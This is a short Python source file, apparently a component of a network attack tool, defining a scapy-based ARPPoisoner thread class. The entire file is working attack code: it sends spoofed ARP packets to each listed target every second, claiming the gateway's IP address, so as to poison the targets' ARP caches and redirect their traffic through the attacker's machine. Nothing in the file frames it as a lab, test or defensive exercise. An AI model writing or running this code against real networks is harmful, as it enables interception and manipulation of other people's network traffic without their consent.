from threading import Thread
from scapy.all import *
class ARPPoisoner(Thread):

	def __init__(self,targets,gateway_ip):
		Thread.__init__(self)
		self.targets = targets
		self.gateway_ip = gateway_ip
		self.setDaemon(True)

	def arp_poison(self):
		while 1:
			for target in self.targets:
				packet = Ether(dst=target[1])/ARP(op="who-has", psrc=self.gateway_ip, pdst=target[0])
				sendp( packet , verbose=False)
			time.sleep(1)

	def run(self):
		self.arp_poison()
